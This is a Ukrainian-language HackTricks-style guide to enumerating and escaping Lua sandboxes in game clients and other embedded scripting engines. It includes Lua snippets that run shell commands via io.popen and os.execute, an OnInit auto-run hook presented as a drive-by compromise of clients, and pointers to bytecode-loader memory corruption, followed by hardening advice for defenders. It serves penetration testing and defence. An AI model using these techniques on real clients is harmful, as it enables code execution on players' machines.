# Обхід Lua sandbox (вбудовані VM, ігрові клієнти)

{{#include ../../../banners/hacktricks-training.md}}

На цій сторінці зібрано практичні техніки для перерахування та виходу з Lua "sandbox", вбудованих у застосунки (зокрема ігрові клієнти, plugins або in-app scripting engines). Багато рушіїв надають обмежене середовище Lua, але залишають доступними потужні globals, які уможливлюють довільне виконання команд або навіть native memory corruption, коли доступні bytecode loaders.

Ключові ідеї:
- Розглядайте VM як невідоме середовище: перераховуйте _G і виявляйте доступні небезпечні primitives.
- Коли stdout/print заблоковано, використовуйте будь-який внутрішній UI/IPC channel як output sink, щоб спостерігати результати.
- Якщо io/os доступні, часто ви отримуєте пряме виконання команд (io.popen, os.execute).
- Якщо доступні load/loadstring/loadfile, виконання підготовленого Lua bytecode у деяких версіях може порушити memory safety (verifiers у версіях ≤5.1 можна обійти; у 5.2 verifier видалено), що уможливлює advanced exploitation.

## Перерахування sandboxed environment

- Виведіть global environment, щоб скласти інвентар доступних tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Якщо print() недоступна, перепрофілюйте внутрішньо-VM канали. Приклад із VM скриптів облаштування житла в MMO, де виведення в чат працює лише після виклику звуку; наведене нижче створює надійну функцію виведення:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Узагальніть цей шаблон для своєї цілі: будь-яке текстове поле, toast, logger або callback інтерфейсу, що приймає рядки, може виконувати роль stdout для розвідки.

## Безпосереднє виконання команд, якщо доступні io/os

Якщо sandbox і досі надає доступ до стандартних бібліотек io або os, імовірно, ви одразу отримуєте виконання команд:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Нотатки:

- Виконання відбувається всередині процесу клієнта; багато рівнів anti-cheat/antidebug, які блокують зовнішні дебагери, не перешкоджатимуть створенню процесів у VM.
- Також перевірте: package.loadlib (завантаження довільних DLL/.so), require з native modules, ffi у LuaJIT (якщо доступний) і debug library (може підвищувати привілеї всередині VM).

## Тригери без взаємодії через auto-run callbacks

Якщо host application надсилає скрипти клієнтам, а VM відкриває auto-run hooks (наприклад, OnInit/OnLoad/OnEnter), розмістіть там свій payload для drive-by compromise одразу після завантаження скрипту:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Будь-який еквівалентний callback (OnLoad, OnEnter тощо) узагальнює цю техніку, коли скрипти автоматично передаються та виконуються на клієнті.

## Небезпечні примітиви, які слід шукати під час recon

Під час переліку `_G` особливо шукайте:
- io, os: io.popen, os.execute, файловий ввід/вивід, доступ до змінних середовища.
- load, loadstring, loadfile, dofile: виконання source або байткоду; підтримує завантаження недовіреного байткоду.
- package, package.loadlib, require: динамічне завантаження бібліотек і поверхня модулів.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo і хуки.
- Лише LuaJIT: ffi.cdef, ffi.load для прямого виклику нативного коду.

Мінімальні приклади використання (якщо доступні):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Необов’язкова ескалація: зловживання Lua bytecode loaders

Коли load/loadstring/loadfile доступні, але io/os обмежені, виконання спеціально створеного Lua bytecode може призвести до розкриття та пошкодження пам’яті. Ключові факти:
- У Lua ≤ 5.1 був вбудований bytecode verifier, для якого відомі bypasses.<sup>[[4]](#references)</sup>
- У Lua 5.2 verifier повністю видалили (офіційна позиція: applications мають просто відхиляти precompiled chunks), що розширює attack surface, якщо завантаження bytecode не заборонено.<sup>[[2]](#references)[[3]](#references)</sup>
- Зазвичай workflow такий: витік pointers через виведення всередині VM, створення bytecode для type confusions (наприклад, навколо FORLOOP або інших opcodes), а потім перехід до arbitrary read/write або native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Цей шлях залежить від конкретного engine/version і потребує RE. Дивіться references для детального розбору, exploitation primitives і прикладів gadgetry в іграх.

## Нотатки щодо detection і hardening (для defenders)

- На стороні сервера: відхиляйте або переписуйте user scripts; використовуйте allowlist безпечних APIs; видаляйте або прив’язуйте до порожніх значень io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- На стороні клієнта: запускайте Lua з мінімальним _ENV, забороняйте завантаження bytecode, повторно додайте strict bytecode verifier або signature checks і блокуйте створення процесів із client process.
- Telemetry: створюйте alert на створення gameclient → child process невдовзі після завантаження script; зіставляйте це з UI/chat/script events.

## References

- [1] [Цей дім одержимий: RCE десятирічної давності в AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: розбір недоліків Lua security у Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): обговорення вилучення bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist із bypasses/notes для verifier)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
